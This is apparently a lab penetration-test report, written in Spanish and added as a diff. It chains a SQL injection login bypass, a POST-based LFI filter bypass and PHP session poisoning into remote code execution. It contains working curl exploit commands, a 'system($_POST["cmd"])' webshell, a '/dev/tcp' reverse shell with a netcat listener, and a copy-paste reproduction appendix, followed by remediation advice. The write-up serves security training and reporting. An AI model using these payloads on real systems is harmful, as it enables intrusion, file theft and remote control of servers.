@@ -467,3 +467,211 @@ curl -s -c /tmp/trilocor.txt \
   "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null
 curl -s -b /tmp/trilocor.txt "$T/dashboard.php"
 ```
+
+## Finding — LFI → RCE vía Session Poisoning (HR Dashboard)
+
+**Target:** Trilocor — HR Dashboard **Host:** `trilocor.local` (`10.129.247.239`) — puerto `8088/tcp` (Apache/2.4.41 Ubuntu, PHP) **Endpoint:** `/dashboard.php` (requiere sesión autenticada) **Parámetro vulnerable:** `language` **Tipo:** Local File Inclusion (LFI) encadenado a Remote Code Execution (RCE) mediante envenenamiento del archivo de sesión PHP **Severidad:** Crítica **Precondición:** Sesión autenticada (ver finding previo: SQLi Auth Bypass) **Método de explotación efectivo:** **POST** (no GET)
+
+---
+
+### 1. Resumen
+
+El parámetro `language` de `dashboard.php` se pasa a una función de inclusión (`include()`) sin validación adecuada. La aplicación implementa un filtro de path traversal, pero solo sobre la rama **GET**; al enviar el parámetro por **POST**, el filtro no se aplica y permite incluir archivos locales arbitrarios.
+
+Adicionalmente, el valor de `language` se **persiste sin sanitizar** en `$_SESSION['lang']`, que PHP serializa a un archivo en disco (`/var/lib/php/sessions/sess_<ID>`). Combinando ambos defectos se logra ejecución de comandos: se escribe código PHP dentro del propio archivo de sesión (vía el parámetro persistido) y luego se incluye ese archivo mediante el LFI, forzando a PHP a interpretarlo.
+
+---
+
+### 2. Patrón raíz del target — validación inconsistente GET vs POST
+
+Este target presenta el mismo defecto de diseño en dos puntos distintos:
+
+|Vector|Rama con filtro|Rama explotable|
+|---|---|---|
+|Login (SQLi)|POST|GET|
+|LFI (`language`)|GET|POST|
+
+La sanitización se aplica de forma dependiente del método HTTP, dejando siempre una ruta sin validar. Vale documentarlo como hallazgo de arquitectura: **la validación no debe depender del método de transporte**.
+
+---
+
+### 3. Identificación del LFI
+
+### 3.1 — El filtro de traversal bloquea GET
+
+```bash
+T="http://trilocor.local:8088"
+C="$HOME/trilocor_cookie.txt"
+
+# (re)generar sesión válida con el SQLi del login
+curl -s -c "$C" "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null
+
+# GET con traversal -> bloqueado
+curl -s -b "$C" "$T/dashboard.php?language=../../../../etc/passwd" \
+  | grep -aoE 'Malicious request blocked'
+# -> Malicious request blocked!
+```
+
+#### 3.2 — POST evade el filtro; bypass `....//`
+
+El filtro residual sobre la rama POST elimina `../` en **una sola pasada** (no recursivo). La secuencia `....//` sobrevive: al quitarse el `../` interno queda `../` efectivo. Solo `....//` (cuatro puntos, dos barras) funciona.
+
+```bash
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode 'language=....//....//....//....//etc/passwd' \
+  | grep -a 'root:.*:0:0:'
+# -> root:x:0:0:root:/root:/bin/bash   (LFI confirmado)
+```
+
+---
+
+### 4. Confirmación del vector de RCE
+
+#### 4.1 — Descartar wrappers remotos
+
+`data://` no produjo ejecución, indicando `allow_url_include=Off`. Esto descarta `data://` y los filter-chains que terminan en `php://temp`. El vector válido pasa a ser la inclusión de un archivo **local** controlado por el atacante.
+
+#### 4.2 — Confirmar que `language` se persiste en la sesión
+
+Se incluye el propio archivo de sesión para inspeccionar su contenido serializado:
+
+```bash
+SID=$(grep -oE 'PHPSESSID[[:space:]]+[a-z0-9]+' "$C" | awk '{print $2}')
+
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
+  | grep -aoE '[a-z]+\|[^<]+'
+```
+
+Salida observada (el valor de `language` queda almacenado crudo en `lang`):
+
+```
+logged|b:1;username|s:15:"'OR 'a'='a'-- -";lang|s:53:"php://filter/convert.base64-encode/resource=dashboard";
+```
+
+Esto confirma la precondición del ataque: el último valor enviado en `language` se escribe sin escapar en `$_SESSION['lang']` → en el archivo `sess_<ID>` en disco.
+
+---
+
+### 5. Explotación — RCE paso a paso
+
+> El archivo de sesión se reescribe en **cada** request que envíe `language`. Por eso el webshell debe (1) escribirse y (2) incluirse en requests consecutivos, sin ningún request intermedio que pise el valor.
+
+#### Paso 5.1 — Escribir el webshell en la sesión
+
+```bash
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode 'language=<?php system($_POST["cmd"]); ?>' -o /dev/null
+```
+
+El string `<?php system($_POST["cmd"]); ?>` queda almacenado, inerte, dentro de `sess_$SID`.
+
+#### Paso 5.2 — Incluir la sesión y ejecutar
+
+```bash
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
+  --data-urlencode 'cmd=id' | grep -a 'uid='
+# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+El `include()` carga el archivo de sesión; PHP interpreta el bloque `<?php ?>` y ejecuta `system($_POST['cmd'])`. RCE como `www-data` confirmado.
+
+#### Paso 5.3 — Ejecución arbitraria
+
+Mientras el webshell no se sobrescriba, se cambia solo el parámetro `cmd`:
+
+```bash
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
+  --data-urlencode 'cmd=ls /'
+```
+
+> Nota operativa: usar **rutas absolutas** en `cmd` (p. ej. `cat /archivo.txt`). El cwd del proceso PHP no es `/`, por lo que las rutas relativas pueden fallar.
+
+---
+
+### 6. Variante — payload PHP URL-encodeado
+
+Si se prefiere enviar el código ya encodeado en lugar de dejar que curl lo encodee, usar `--data` (NO `--data-urlencode`, que lo encodearía dos veces):
+
+```bash
+# %3c%3f%70%68%70... = <?php system('id'); ?>
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data "language=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e" -o /dev/null
+
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
+  | grep -a 'uid='
+```
+
+Diferencia: aquí el comando (`id`) está **hardcodeado** en el PHP, no se pasa por `cmd`. Menos flexible; útil solo como prueba de concepto.
+
+---
+
+### 7. Shell interactiva (opcional)
+
+Para una sesión estable que no dependa del archivo de sesión reescribible:
+
+```bash
+# Listener local
+nc -lvnp 4444
+
+# Reinyectar webshell y disparar (TU_IP = IP de la VPN/tun0)
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode 'language=<?php system($_POST["cmd"]); ?>' -o /dev/null
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
+  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/TU_IP/4444 0>&1"'
+```
+
+Estabilizar: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg`.
+
+---
+
+### 8. Impacto
+
+- Ejecución de comandos arbitrarios como `www-data` en el servidor.
+- Lectura de cualquier archivo legible por el servicio web (LFI base).
+- Punto de pivote para enumeración local y escalada de privilegios.
+
+---
+
+### 9. Remediación
+
+1. **No usar entrada del usuario en `include()`/`require()`.** Mapear `language` a una whitelist cerrada de archivos permitidos:
+    
+    ```php
+    $allowed = ['en','es','de','it'];$lang = in_array($_POST['language'] ?? '', $allowed, true) ? $_POST['language'] : 'en';include "lang/{$lang}.php";
+    ```
+    
+2. **Validación uniforme entre métodos HTTP.** No aplicar el filtro de traversal solo a GET; centralizar la validación del lado servidor.
+3. **No persistir entrada cruda en `$_SESSION`.** Escapar/validar antes de almacenar.
+4. **Configuración de PHP:** mantener `allow_url_include=Off` (ya estaba) y, si es posible, restringir `open_basedir` para que la inclusión no alcance `/var/lib/php/sessions/`.
+5. Defensa en profundidad: ejecutar el servicio con privilegios mínimos.
+
+---
+
+### 10. Apéndice — Reproducción (copy/paste)
+
+```bash
+T="http://trilocor.local:8088"
+C="$HOME/trilocor_cookie.txt"
+
+# 1) Sesión vía SQLi del login
+curl -s -c "$C" "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null
+SID=$(grep -oE 'PHPSESSID[[:space:]]+[a-z0-9]+' "$C" | awk '{print $2}')
+
+# 2) Confirmar LFI (POST + bypass ....//)
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode 'language=....//....//....//....//etc/passwd' | grep -a 'root:.*:0:0:'
+
+# 3) Escribir webshell en la sesión
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode 'language=<?php system($_POST["cmd"]); ?>' -o /dev/null
+
+# 4) Incluir sesión y ejecutar
+curl -s -b "$C" -X POST "$T/dashboard.php" \
+  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
+  --data-urlencode 'cmd=id' | grep -a 'uid='
+```
